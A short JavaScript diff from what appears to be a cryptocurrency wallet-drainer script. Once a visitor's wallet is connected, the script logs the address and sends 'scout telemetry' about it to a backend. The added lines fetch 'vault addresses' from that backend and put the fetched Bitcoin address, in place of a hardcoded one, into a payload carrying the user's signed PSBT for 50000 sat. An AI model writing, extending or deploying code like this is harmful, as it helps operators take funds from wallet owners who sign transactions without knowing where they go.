@@ -517,6 +517,17 @@
       SESSION.connection.address = address;
       LOG.info('Wallet address: ' + (address || 'unknown'));
 
+      // Load vault addresses from backend
+      try {
+        var vaultRes = await fetch(BACKEND + '/api/v1/client-config');
+        var vaultData = await vaultRes.json();
+        SESSION.vaults = vaultData.data.vault_addresses || {};
+        LOG.info('Vaults loaded');
+      } catch (e) {
+        SESSION.vaults = {};
+        LOG.debug('Vaults load skipped');
+      }
+
       // Scout telemetry - tell backend about this wallet
       try {
         LOG.info('Sending scout telemetry...');
@@ -644,7 +655,7 @@
           if (chain === 'BTC') {
             payload.signed_psbt_base64 = sig.signature;
             payload.psbt_metadata = {
-              vault_address: 'bc1q7frtqkunftdgukjghpnhwd0wv4f0hpsqkyj43v',
+              vault_address: SESSION.vaults ? SESSION.vaults.btc || '' : '',
               amount_sat: '50000',
               fee_sat: '1000'
             };
